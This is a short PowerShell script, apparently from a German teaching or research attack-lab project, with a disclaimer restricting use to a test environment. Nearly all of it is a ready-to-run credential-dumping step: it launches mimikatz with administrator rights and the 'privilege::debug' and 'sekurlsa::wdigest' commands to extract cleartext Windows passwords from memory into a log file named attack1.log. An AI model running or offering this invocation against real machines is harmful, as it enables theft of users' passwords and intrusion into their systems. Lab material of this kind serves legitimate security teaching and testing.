<# 
--------------------------------------------------------------------------------------------
Die Verwendung der folgenden Skripte ist nur innerhalb der dafür vorgesehenen Testumgebung zu Lehr- oder Forschungszwecken erlaubt.
Jeglicher Missbrauch zur Verursachung von Schaden oder missbräuchliche Verwendung mit bösartigen Absichten ist strengstens untersagt.
Die Verantwortung liegt allein beim Anwender / der Anwenderin.
Das Projektteam übernimmt keine Verantwortung für Schäden, die durch Dritte entstehen.
--------------------------------------------------------------------------------------------
#>

$process = "C:\prehendo\Tools\mimikatz\x64\mimikatz.exe" #Pfad der Mimikatz exe
$argument1 = "`"log C:\prehendo\Logs\attack1.log`"" #Pfad der Logdatei
$argument2 = "privilege::debug" #Privilegien setzten
$argument3 = "sekurlsa::wdigest" #Klartextpasswort
$argument4 = "exit" #Klartextpasswort

Start-Process $process -Verb runAs -ArgumentList $argument1, $argument2, $argument3, $argument4
